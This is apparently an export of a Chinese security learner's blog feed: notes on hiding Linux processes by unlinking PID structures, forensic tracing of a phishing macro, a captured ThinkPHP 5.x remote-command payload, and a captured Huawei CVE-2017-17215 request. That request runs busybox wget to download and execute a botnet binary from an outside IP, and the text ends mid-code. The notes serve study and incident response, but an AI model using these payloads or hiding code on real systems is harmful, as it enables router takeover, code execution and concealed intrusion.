src="https://github.com/g0dA/linuxStack/raw/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2-%E6%94%BB%E7%AF%87_files/e1b0b0eb-3299-4682-819b-d1882c3b32c3.png" alt="e1b0b0eb-3299-4682-819b-d1882c3b32c3.png"></a></p><p>具体的介绍在<a href="https://www.cnblogs.com/hazir/p/linux_kernel_pid.html">Linux 内核进程管理之进程ID</a>说的很详细了，只不过其中的代码有些老了，那先前提出的种种零散的知识就可以连起来了：</p><ol><li><code>pid_task</code>的作用是根据<code>pid</code>来找到对应的<code>task_struct</code>，其运行核心是<code>container_of机制</code>，而能否返回有效的数据取决于传入的<code>pid</code>是否有效，而其中有一个<code>tasks[type]</code>哈希表的使用，能够根据一个<code>pid</code>实体找到头节点的<code>task_struct</code>实体。</li><li><code>find_pid_ns</code>则是通过<code>pid_t</code>来找到所要的<code>pid</code>实体。如果对照下老版内核(v3.16)的代码，实际很容易就可以看出来，其中直接用到了<code>pid_hash</code>表：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">struct pid *find_pid_ns(int nr, struct pid_namespace *ns)</span><br><span class="line">&#123;</span><br><span class="line"> struct upid *pnr;</span><br><span class="line"></span><br><span class="line"> hlist_for_each_entry_rcu(pnr,</span><br><span class="line">   &amp;pid_hash[pid_hashfn(nr, ns)], pid_chain)</span><br><span class="line">  if (pnr-&gt;nr == nr &amp;&amp; pnr-&gt;ns == ns)</span><br><span class="line">   return container_of(pnr, struct pid,</span><br><span class="line">     numbers[ns-&gt;level]);</span><br><span class="line"></span><br><span class="line"> return NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为只是为了隐藏<code>ps</code>的进程，所以需要针对的是<code>proc</code>的查询方式，其中<code>pid</code>的来源和<code>find_vpid</code>差不多的实现，只不过用的是<code>find_ge_pid</code>，然而还是一样的<code>idr</code>机制，直接就可以pass了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * Used by proc to find the first pid that is greater than or equal to nr.</span><br><span class="line"> *</span><br><span class="line"> * If there is a pid at nr this function is exactly the same as find_pid_ns.</span><br><span class="line"> */</span><br><span class="line">struct pid *find_ge_pid(int nr, struct pid_namespace *ns)</span><br><span class="line">&#123;</span><br><span class="line"> return idr_get_next(&amp;ns-&gt;idr, &amp;nr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那先前<code>proc_pid_readdir</code>的流程就可以换一下了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proc_pid_readdir -&gt; next_tgid -&gt;  find_ge_pid -&gt; pid_task -&gt; hlist_entry</span><br></pre></td></tr></table></figure><p>说白了如果只是对链表做操作，无法决定<code>struct pid</code>的获取，那就只能在后一步，劫持一下<code>first</code>了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pid_t pid = 2068;</span><br><span class="line">hiden_pid = find_vpid(pid);</span><br><span class="line">hiden_pid-&gt;tasks[PIDTYPE_PID].first=NULL;</span><br></pre></td></tr></table></figure><p>没错，就这么三行代码！！就搞定了！！ 我都不知道算不算DKOM脱链，但确实是从<code>ps</code>里消失了，而且<code>/proc</code>下也不会有这个目录。</p><p><a href="https://github.com/g0dA/linuxStack/blob/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2-%E6%94%BB%E7%AF%87_files/1eabe304-f0b6-4f0a-be9f-4e1e4157e2a8.png"><img src="https://github.com/g0dA/linuxStack/raw/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2-%E6%94%BB%E7%AF%87_files/1eabe304-f0b6-4f0a-be9f-4e1e4157e2a8.png" alt="1eabe304-f0b6-4f0a-be9f-4e1e4157e2a8.png"></a></p><blockquote><p>关于<code>pid_hash</code>还有<code>pid_namespace</code>这些还要补坑，因为我自己还不是理的很顺。</p></blockquote><h2 id="硬件级"><a href="#硬件级" class="headerlink" title="硬件级"></a>硬件级</h2><h3 id="Bios劫持"><a href="#Bios劫持" class="headerlink" title="Bios劫持"></a>Bios劫持</h3><blockquote><p>看了看大概的文章，需要插U盘什么的，而且有<code>EFI</code>的开发，放弃</p></blockquote><h1 id="还有很多很多技术！！！但是"><a href="#还有很多很多技术！！！但是" class="headerlink" title="还有很多很多技术！！！但是"></a>还有很多很多技术！！！但是</h1><blockquote><p>吐槽一下自己吧。</p></blockquote><p><a href="https://github.com/g0dA/linuxStack/blob/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2-%E6%94%BB%E7%AF%87_files/cfda8903-3152-4694-b40e-17b79caca27d.jpg"><img src="https://github.com/g0dA/linuxStack/raw/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2-%E6%94%BB%E7%AF%87_files/cfda8903-3152-4694-b40e-17b79caca27d.jpg" alt="cfda8903-3152-4694-b40e-17b79caca27d.jpg"></a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>攻与防无非看谁更底层，看谁能修改谁的东西，而各种技术的实现上基本都是针对某个点的各种<code>hook</code>，<a href="http://www.voidcn.com/article/p-sfjritoa-bcx.html">LINUX HOOK技术</a>是一个比较好的入门文章，各种技术都介绍的比较全面，后续将填一下<code>hook</code>技术的坑。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://blog.brickgao.com/2016/08/07/simple-rootkit/">通过内核模块实现隐藏信息的 Rootkit</a></li><li><a href="http://netinfo-security.org/article/2016/1671-1122-0-4-1.html#close">基于LKM系统调用劫持的恶意软件行为监控技术研究</a></li><li><a href="http://blog.51cto.com/staronmytop/1119475">Linux下的RootKit简单介绍与分析</a></li><li><a href="https://pengcc.iteye.com/blog/910449">Linux内核模块与应用程序的区别</a></li><li><a href="https://www.ibm.com/developerworks/cn/linux/kernel/syscall/part1/appendix.html">系统调用表</a></li><li><a href="https://blog.csdn.net/u012301943/article/details/25830229">linux–函数劫持–基于LD_PRELOAD</a></li><li><a href="https://www.cnblogs.com/codingMozart/p/4829367.html">linux dll劫持</a></li><li><a href="https://www.linuxidc.com/Linux/2017-12/149841.htm">动态连接的诀窍：使用 LD_PRELOAD 去欺骗、注入特性和研究程序</a></li><li><a href="https://github.com/hschen0712/process-hiding">linux下实现进程隐藏</a></li><li><a href="https://hk.saowen.com/a/660685647e44a4d6f7e5ee0bf56e2faa5191b2d562516bd2ea979a3de9ae064a">LD_PRELOAD的偷樑換柱之能</a></li><li><a href="https://hk.saowen.com/a/a1af7350165c37f0cbef19116c2f0ea257a9f55f94fe420cd54f2d1140f42034">Linux動態鏈接庫預加載型rootkit的檢測技術</a></li><li><a href="http://9bie.org/index.php/archives/354/">新坑预定：linux下的进程&#x2F;文件隐藏</a></li><li><a href="https://blog.csdn.net/zhuyi2654715/article/details/7605051">Linux下DIR，dirent,stat等结构体详解</a></li><li><a href="https://my.oschina.net/jxcdwangtao/blog/828645">劫持系统函数Demo</a></li><li><a href="https://www.ibm.com/developerworks/cn/linux/l-dynamic-libraries/index.html">Linux 动态库剖析</a></li><li><a href="https://www.cnblogs.com/coolalan/p/3978215.html">增加-进程隐藏功能的系统调用</a></li><li><a href="http://www.carch.ac.cn/uploadfile/2017/0824/20170824052844948.pdf">Linux内核级Rootkit检测研究 - 计算机体系结构国家重点实验室</a></li><li>[<a href="http://bbs.javaee.cc/post/250772_1_1.html">杂七杂八] rootkit技术</a></li><li><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-vfs/index.html">从文件 I&#x2F;O 看 Linux 的虚拟文件系统</a></li><li><a href="http://drops.xmd5.com/static/drops/tips-4731.html">Linux下基于内存分析的Rootkit检测方法</a></li><li><a href="http://www.voidcn.com/article/p-nzamfimp-wk.html">proc文件系统_每进程信息形成原理、目录遍历方式、位图查找</a></li><li><a href="https://blog.csdn.net/dog250/article/details/84201114">Linux内核如何替换内核函数并调用原始函数</a></li><li><a href="https://blog.csdn.net/gatieme/article/details/51383272">Linux进程描述符task_struct结构体详解–Linux进程的管理与调度（一</a></li><li><a href="https://blog.csdn.net/billpig/article/details/6038330">linux 隐藏进程 - crux实现</a></li><li><a href="https://www.ibm.com/developerworks/library/l-kprobes/index.html">Kernel debugging with Kprobes</a></li><li><a href="http://www.voidcn.com/article/p-sfjritoa-bcx.html">LINUX HOOK技术</a></li><li><a href="https://blog.csdn.net/wangkai_123456/article/details/22524875">函数指针和指针函数</a></li><li><a href="https://insswer.iteye.com/blog/1040408">嵌入式C语言笔记03——函数指针，内存陷阱，堆栈</a></li><li><a href="http://docs.linuxtone.org/ebooks/C&CPP/c/ch29s03.html">VFS文件系统</a></li><li><a href="https://hyshucom.iteye.com/blog/1681448">Linux 2.6 劫持系统调用 隐藏进程</a></li><li><a href="https://www.cnblogs.com/LittleHann/p/3910696.html">Rootkit Hacking Technology &amp;&amp; Defence Strategy Research</a></li><li><a href="https://arkingc.github.io/2017/08/18/2017-08-18-linux-code-vfs/#VFS%E4%B8%AD%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84">VFS中的基本结构</a></li><li><a href="https://www.cnblogs.com/embedded-linux/p/5663176.html">linux虚拟文件系统vfs</a></li><li><a href="http://tinylab.org/linux-kernel-uapi/">Linux Kernel UAPI</a></li><li><a href="https://blog.csdn.net/wenqiang1208/article/details/55809008">Linux下的FILE结构体</a></li><li><a href="http://landcareweb.com/questions/5663/linux-kernel-xi-tong-diao-yong-gua-gou-shi-li">Linux Kernel：系统调用挂钩示例</a></li><li><a href="https://www.freebuf.com/articles/system/54263.html">Linux Rootkit系列一：LKM的基础编写及隐藏</a></li><li><a href="http://blog.chinaunix.net/uid-20321537-id-1966892.html">linux 内核库函数</a></li><li><a href="https://docs-conquer-the-universe.readthedocs.io/zh_CN/latest/linux_rootkit.html">Linux Rootkit 研究</a></li><li><a href="http://www.doc88.com/p-2072466235621.html">LInux中实现进程隐藏的一种新方法</a></li><li><a href="https://www.cnblogs.com/sky-heaven/p/5192778.html">获得内核函数地址的四种方法</a></li><li><a href="https://www.cnblogs.com/bittorrent/p/3804141.html">获取Linux内核未导出符号的几种方式</a></li><li><a href="https://linux.cn/article-7411-1.html">Linux 内核自防护项目 KSPP</a></li><li><a href="https://zhuanlan.zhihu.com/p/51645782">如何增强Linux内核中的访问控制安全</a></li><li><a href="http://blog.51cto.com/laokaddk/421860">高级Linux Kernel Inline Hook技术分析与实现</a></li><li><a href="https://www.ibm.com/developerworks/cn/linux/l-kprobes.html">使用 Kprobes 调试内核</a></li><li><a href="http://b8807053.pixnet.net/blog/post/340096445-[%E8%BD%89]oops%E4%B8%AD%E7%9A%84error-code%E8%A7%A3%E9%87%8B">Oops中的error code解釋</a></li><li><a href="http://www.it610.com/article/4559233.htm">Linux内核通过inline hook实现隐藏进程</a></li><li><a href="https://blog.csdn.net/andy205214/article/details/77148573">Linux内核调试技术——kprobe使用与实现</a></li><li><a href="http://blog.chinaunix.net/uid-23769728-id-3198044.html">浅析kprobe调试方法的背后原理</a></li><li><a href="http://bbs.chinaunix.net/thread-1946913-1-1.html">Linux下实现劫持系统调用的总结</a></li><li><a href="https://blog.csdn.net/jieqiong1/article/details/54379265">系统接口——系统调用的实现</a></li><li><a href="https://www.cnblogs.com/wuchanming/p/4490622.html">系统调用</a></li><li><a href="https://www.open-open.com/pdf/bb576d1c368c43fb9c3c0dc36e37fb7e.html">由实模式到start_kernel</a></li><li><a href="http://blog.chinaunix.net/uid-27717694-id-3942170.html">linux下X86架构IDT解析</a></li><li><a href="https://www.cnblogs.com/lq0729/articles/2796448.html">CALL指令有多少种写法</a></li><li>[<a href="https://cloud.tencent.com/developer/article/1087370">linux][retpoline] retpoline技术分析</a></li><li><a href="http://blog.sina.com.cn/s/blog_6badf70001010qlf.html">Intel系列CPU指令速查手册</a></li><li><a href="https://blog.csdn.net/wdxz6547/article/details/50993837">内核分析-第五周</a></li><li><a href="https://blog.csdn.net/sdulibh/article/details/82852900">深入理解 x86&#x2F;x64 的中断体系–IVT VS IDT</a></li><li><a href="https://lrita.github.io/2019/03/05/linux-interrupt-and-trap/#%E4%B8%AD%E6%96%AD%E7%9A%84%E5%AE%9A%E4%B9%89%E4%B8%8E%E7%A7%8D%E7%B1%BB">中断的定义与种类</a></li><li><a href="http://www.cppblog.com/converse/archive/2009/04/29/81496.html">linux内核V2.6.11学习笔记(5)–异常处理</a></li><li><a href="https://blog.csdn.net/beswkwangbo/article/details/8145190">实例一——为自己的操作系统中加入中断(中断机制的实现)</a></li><li><a href="https://www.jianshu.com/p/a81f0822190b">利用gdb python extention学习内核</a></li><li><a href="https://blog.csdn.net/skyflying2012/article/details/7850674">细说内核中断机制</a></li><li><a href="https://www.binss.me/blog/the-analysis-of-linux-system-call/">Linux系统调用过程分析</a></li><li><a href="http://www.kbase101.com/question/56665.html">在x86_64 linux中进行系统调用是否仍会产生中断？</a></li><li><a href="https://stackoverflow.com/questions/15168822/intel-x86-vs-x64-system-call">Intel x86 vs x64 system call</a></li><li><a href="http://www.cppblog.com/hex108/archive/2010/11/22/134313.html">linux下的vdso与vsyscall</a></li><li><a href="http://lastweek.io/lego/syscall/compat/">Compat SYSCALL in Lego</a></li><li><a href="https://stackoverflow.com/questions/46087730/what-happens-if-you-use-the-32-bit-int-0x80-linux-abi-in-64-bit-code">What happens if you use the 32-bit int 0x80 Linux ABI in 64-bit code?</a></li><li><a href="https://stackoverflow.com/questions/344829/what-is-kernel-vsyscall">what-is-kernel-vsyscall</a></li><li><a href="https://www.binss.me/blog/interrupt-and-exception/">中断和异常</a></li><li><a href="https://blog.csdn.net/hxmhyp/article/details/22699669">Linux系统调用之SYSCALL_DEFINE</a></li><li><a href="https://blog.csdn.net/hxmhyp/article/details/22619729">Linux CVE-2009-0029 漏洞解析</a></li><li><a href="https://www.cnblogs.com/LittleHann/p/4649366.html">UEFI BIOS Rootkit Analysis</a></li><li><a href="https://www.cnblogs.com/zfyouxi/p/4263622.html">进程的管理与调度</a></li><li><a href="https://www.cnblogs.com/lknlfy/archive/2012/07/09/2582397.html">Linux内核中的双向循环链表学习</a></li><li><a href="http://www.cnblogs.com/LittleHann/p/3870974.html">Linux Rootkit Learning</a></li><li><a href="https://edsionte.com/techblog/archives/1841">遍历进程链表</a></li><li><a href="https://www.cnblogs.com/riky/archive/2006/12/28/606242.html">linux 内核分析之list_head</a></li><li><a href="https://r00tk1ts.github.io/2017/08/22/Linux%E8%BF%9B%E7%A8%8B%E6%A6%82%E8%BF%B0/">Linux内核学习——Linux进程概述</a></li><li><a href="https://www.linuxidc.com/wap.aspx?nid=78001&p=4&cid=6&sp=56">哈希链表的遍历</a></li><li><a href="https://blog.csdn.net/YuZhiHui_No1/article/details/38357899">linux内核之哈希链表解析</a></li><li><a href="http://www.voidcn.com/article/p-oyhzfnjz-sq.html">哈希表在进程管理中的应用</a></li><li><a href="https://blog.csdn.net/jianghuan555/article/details/38037877">linux 进程管理—–pid哈希链表</a></li><li><a href="https://stackoverflow.com/questions/27862132/inserting-a-pid-in-the-linux-hash-table">Inserting a PID in the Linux Hash-Table</a></li><li><a href="https://blog.csdn.net/viewsky11/article/details/53123651">Linux kernel Hash list</a></li><li><a href="https://github.com/gatieme/LDD-LinuxDeviceDrivers/tree/master/study/kernel/01-process/01-task/03-pid">Linux进程ID号–Linux进程的管理与调度（三）</a></li><li><a href="http://wiki.dreamrunner.org/public_html/Embedded-System/kernel/list-and-hlist.html">list-and-hlist</a></li><li><a href="http://blog.chinaunix.net/uid-27033491-id-3291864.html">pid到struct pid内核函数详解</a></li><li><a href="http://blog.tiaozaoj.com/index.php/archives/194/">linux内核根据pid，列出家族信息中的程序名和PID号</a></li><li><a href="https://carecraft.github.io/basictheory/2017/03/linux-pid-manage/">linux内核PID管理</a></li><li><a href="https://www.blackhat.com/presentations/win-usa-04/bh-win-04-butler.pdf">bh-win-04-butler</a></li><li><a href="https://github.com/novelinux/linux-4.x.y/tree/master/kernel/pid.c">novelinux</a></li><li><a href="http://blog.udn.com/2768717191/25366271">linux的container_of</a></li><li><a href="https://juejin.im/post/59f6e0a86fb9a045167c7831">深入理解 Linux 的 RCU 机制</a></li><li><a href="https://blog.csdn.net/weijitao/article/details/79918013">通过pid查找进程task_struct结构体</a></li><li><a href="http://blog.chinaunix.net/uid-27033491-id-3291637.html">linux内核哈希查找（1）</a></li><li><a href="https://www.cnblogs.com/ck1020/p/5954135.html">Linux内核中namespace之PID namespace</a></li><li><a href="https://www.cnblogs.com/hazir/p/linux_kernel_pid.html">Linux 内核进程管理之进程ID</a></li><li><a href="https://blog.csdn.net/bysun2013/article/details/14053937">Linux pid_hash散列表</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;学习大佬的笔记&lt;/p&gt;</summary>
    
    
    
    <category term="学习大佬" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0%E5%A4%A7%E4%BD%AC/"/>
    
    
    <category term="进程隐藏" scheme="http://example.com/tags/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F/"/>
    
  </entry>
  
  <entry>
    <title>3-19</title>
    <link href="http://example.com/2020/03/19/3.19/"/>
    <id>http://example.com/2020/03/19/3.19/</id>
    <published>2020-03-19T01:47:57.000Z</published>
    <updated>2020-03-19T09:50:07.686Z</updated>
    
    <content type="html"><![CDATA[<p>学习转换邮件</p><span id="more"></span><h1 id="取证过程"><a href="#取证过程" class="headerlink" title="取证过程"></a>取证过程</h1><p><strong>只做记录，没有具体整理，大致思路就是这样的</strong></p><p>首先第一步拿到的资料有vhdx、img镜像以及内存RAW</p><p>由于镜像太大不考虑转换虚拟机格式进行分析(StarWind V2V转换工具)</p><p>所以用DiskGenius、UFS Explorer分析</p><p>已知该机器上有多个下载者，分析其入侵方式和过程</p><p>通过排查浏览器下载、用户下载等目录在下载者进入的时间段的文件</p><p>这一步没有找到相关的可疑文件</p><p>然后从日志入手，导入导出</p><p>日志路径位于<code>C:\Windows\System32\winevt\Logs</code></p><p>查看powershell日志，只有有powershell操作就会记录日志</p><p>查找日志前后文件，发现可疑邮件收取、可疑服务开启</p><p>用UFS Explorer打开后选择磁盘右键<code>Save object list to file</code>，导出文件时间表</p><p>foxmail邮件导入导出</p><p>可疑附件，虚拟机逆向分析</p><p>process monitor用过滤器过滤关键字<code>powershell.exe</code></p><p>打开附件并开启宏</p><p>监听并找到powershell对应执行命令，复制到notepad++</p><p>发现命令为base64编码，利用插件解码后为unicode编码</p><p>复制在notepad++重新粘贴，去除空格即可看到原始命令</p><p>命令中包含可疑URL，利用对应域名查找威胁情报</p><p>分析攻击过程，关联可疑服务</p><h1 id="导入邮件目录"><a href="#导入邮件目录" class="headerlink" title="导入邮件目录"></a>导入邮件目录</h1><p>参考链接</p><blockquote><p><a href="http://www.dnpz.net/diannaozhishi/1635.html">http://www.dnpz.net/diannaozhishi/1635.html</a></p></blockquote><p><strong>Foxmail如何导入原来的邮件</strong>的操作方法：（适用于foxmail 7.1及以上版本）</p><p>   一、在转移Foxmail旧数据到新的电脑上之前，我们需要先保存旧的数据，具体文件夹选择：D&#x2F;Programe Files&#x2F;Foxmail 7.2&#x2F;Storage，我们将里边的个人邮箱文件夹（如下图）复制出来到移动设备上就可以了。</p><p><img src="http://www.dnpz.net/uploads/allimg/150317/983-15031G12250509.png" alt="foxmail如何导入原来的邮件"></p><p>   二、到达另一个电脑的位置之后，我们安装7.1版本以上的Foxmail软件，启动之后，由于没有个人邮箱的话，无法启动，所以我们先用一个个人邮箱账户进行添加，这样就能进入Foxmail的主界面了。</p><p>   三、这时，我们开始正式进行foxmail旧数据的导入工作了。</p><p>   第一步，将之前保存的个人邮箱文件夹，复制到相对应Foxmail安装位置，也就是之前提到的D&#x2F;Programe Files&#x2F;Foxmail 7.2&#x2F;Storage，复制进去就可以啦。如图：</p><p><img src="http://www.dnpz.net/uploads/allimg/150317/983-15031G12312318.png" alt="foxmail如何导入原来的邮件"></p><p>   第二步，我们还需要进行一些数据文件的更改，同样地进入Foxmail软件安装位置的根目录，我们找到名称为FMStorage，打开它就可以，小编就是用txt格式打开的。如图：</p><p><img src="http://www.dnpz.net/uploads/allimg/150317/983-15031G1232S03.png" alt="2015-03-17_112512.png"></p><p>   第三步，按照已有的格式，将你的个人邮箱添加进去，记住格式一定要一样，然后点击保存就可以啦，如图：</p><p><img src="http://www.dnpz.net/uploads/allimg/150317/983-15031G124414I.png" alt="foxmail如何导入原来的数据"></p><p>   第四步，以上工作完成以后，我们再重新启动Foxmail，这是你就会发现已经将旧数据导入进来了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;学习转换邮件&lt;/p&gt;</summary>
    
    
    
    <category term="每日学习小结" scheme="http://example.com/categories/%E6%AF%8F%E6%97%A5%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/"/>
    
    
    <category term="取证分析" scheme="http://example.com/tags/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/"/>
    
    <category term="邮件" scheme="http://example.com/tags/%E9%82%AE%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>3-18</title>
    <link href="http://example.com/2020/03/18/3.18/"/>
    <id>http://example.com/2020/03/18/3.18/</id>
    <published>2020-03-18T04:15:57.000Z</published>
    <updated>2020-03-18T10:08:39.919Z</updated>
    
    <content type="html"><![CDATA[<p>学习磁盘取证，木马溯源</p><span id="more"></span><h1 id="Windows-XML事件日志（EVTX）格式"><a href="#Windows-XML事件日志（EVTX）格式" class="headerlink" title="Windows XML事件日志（EVTX）格式"></a>Windows XML事件日志（EVTX）格式</h1><p>参考链接</p><blockquote><p>[<a href="https://github.com/libyal/libevtx/blob/master/documentation/Windows%20XML%20Event%20Log%20%28EVTX%29.asciidoc#2-file-header]">https://github.com/libyal/libevtx/blob/master/documentation/Windows%20XML%20Event%20Log%20%28EVTX%29.asciidoc#2-file-header]</a>(<a href="https://github.com/libyal/libevtx/blob/master/documentation/Windows">https://github.com/libyal/libevtx/blob/master/documentation/Windows</a> XML Event Log (EVTX).asciidoc#2-file-header)</p></blockquote><p>Windows Defender的病毒扫描文件（Defender它是系统自带的病毒检测工具），隔离文件手动删除<br>扫描记录和病毒库备份：C\ProgramData\Microsoft\Windows Defender\Scans\History\Results\Quick<br>C\ProgramData\Microsoft\Windows Defender\Scans\History\Results\Resour</p><p>activex控件目录：WINDOWS\Downloaded Program Files </p><p>dwusplay.exe的描述为“ <strong>InstallShield更新服务安装程序播放器</strong> ”</p><p>dwusplay.exe通常位于“ C：\ Windows \ Downloaded Program Files \”文件夹中。</p><p>日志Microsoft-Windows-Bits-Client中记录Bits传送作业，可以看到下载文件操作</p><p>渗透要积累</p><blockquote><p><a href="https://www.cnblogs.com/hookjoy/category/556211.html">https://www.cnblogs.com/hookjoy/category/556211.html</a></p></blockquote><p>应急响应-先知社区</p><blockquote><p><a href="https://xz.aliyun.com/t/2524#toc-33">https://xz.aliyun.com/t/2524#toc-33</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;学习磁盘取证，木马溯源&lt;/p&gt;</summary>
    
    
    
    <category term="每日学习小结" scheme="http://example.com/categories/%E6%AF%8F%E6%97%A5%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/"/>
    
    
    <category term="windows" scheme="http://example.com/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>3-17</title>
    <link href="http://example.com/2020/03/17/3.17/"/>
    <id>http://example.com/2020/03/17/3.17/</id>
    <published>2020-03-17T02:15:57.000Z</published>
    <updated>2020-03-18T02:57:40.006Z</updated>
    
    <content type="html"><![CDATA[<p>学习</p><span id="more"></span><h1 id="ThinkPHP-5-x远程命令执行漏洞"><a href="#ThinkPHP-5-x远程命令执行漏洞" class="headerlink" title="ThinkPHP 5.x远程命令执行漏洞"></a>ThinkPHP 5.x远程命令执行漏洞</h1><p>流量中发现这样一段payload，发现是远程命令执行漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:9096/public/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure><p>原文链接</p><blockquote><p><a href="https://www.cnblogs.com/backlion/p/10106676.html">https://www.cnblogs.com/backlion/p/10106676.html</a></p></blockquote><h1 id="vm打开vhdx镜像"><a href="#vm打开vhdx镜像" class="headerlink" title="vm打开vhdx镜像"></a>vm打开vhdx镜像</h1><p>StarWind V2V Converter</p><p>安装将vhdx转换vmdk即可</p><p>vhdx与vhd文件</p><p>vhdx是vhd格式的升级，与旧的 VHD 格式相比，VHDX 具有更大的存储容量</p><h2 id="附加VHD报错"><a href="#附加VHD报错" class="headerlink" title="附加VHD报错"></a>附加VHD报错</h2><p>在打开VHDX文件时，出了点意外情况，源文件可以直接挂载到硬盘，拷贝之后打开不。。。</p><p>计算机右键管理–操作–附加VHD，报错<code>由于虚拟磁盘系统限制，无法完成请求的操作。虚拟硬盘文件必须是未压缩和未加密的文件，并且不能是稀疏文件。</code></p><p>解决方法：VHD文件右键–高级–取消压缩内容以便节省磁盘空间</p><p>c盘文件夹</p><p>(Msocache)office本地安装源</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;学习&lt;/p&gt;</summary>
    
    
    
    <category term="每日学习小结" scheme="http://example.com/categories/%E6%AF%8F%E6%97%A5%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/"/>
    
    
    <category term="远程执行漏洞" scheme="http://example.com/tags/%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="虚拟机转换格式" scheme="http://example.com/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%BD%AC%E6%8D%A2%E6%A0%BC%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>3-16</title>
    <link href="http://example.com/2020/03/16/3.16/"/>
    <id>http://example.com/2020/03/16/3.16/</id>
    <published>2020-03-16T08:15:57.000Z</published>
    <updated>2020-03-16T10:30:06.703Z</updated>
    
    <content type="html"><![CDATA[<p>学习</p><span id="more"></span><h1 id="CVE-2017-17215"><a href="#CVE-2017-17215" class="headerlink" title="CVE-2017-17215"></a>CVE-2017-17215</h1><blockquote><p><a href="https://xlab.tencent.com/cn/2018/01/05/a-new-way-to-exploit-cve-2017-17215/">https://xlab.tencent.com/cn/2018/01/05/a-new-way-to-exploit-cve-2017-17215/</a></p></blockquote><p>在分析流量的时候，发现威胁告警中有一个<strong>华为远程命令执行漏洞</strong>，随即找到其相关特征</p><p>完整原流量数据包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /ctrlt/DeviceUpgrade_1 HTTP/1.1</span><br><span class="line">Content-Length: 430</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Accept: */*</span><br><span class="line">Authorization: Digest username=&quot;dslf-config&quot;, realm=&quot;HuaweiHomeGateway&quot;, nonce=&quot;88645cefb1f9ede0e336e3569d75ee30&quot;, uri=&quot;/ctrlt/DeviceUpgrade_1&quot;, response=&quot;3612f843a42db38f48f59d2a3597e19c&quot;, algorithm=&quot;MD5&quot;, qop=&quot;auth&quot;, nc=00000001, cnonce=&quot;248d1a2560100669&quot;</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;s:Body&gt;&lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;&lt;NewStatusURL&gt;$(/bin/busybox wget -g 2.56.8.156 -l /tmp/vt -r /bins/DEMONS.mips; /bin/busybox chmod 777 /tmp/vt;/tmp/vt huawei.mips;&lt;/NewStatusURL&gt;&lt;NewDownloadURL&gt;$(echo HUAWEIUPNP)&lt;/NewDownloadURL&gt;&lt;/u:Upgrade&gt;&lt;/s:Body&gt;&lt;/s:Envelope&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>目前网络流传的PoC大部分为在HTTP的请求头里构造一个适用于基础认证的字段。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 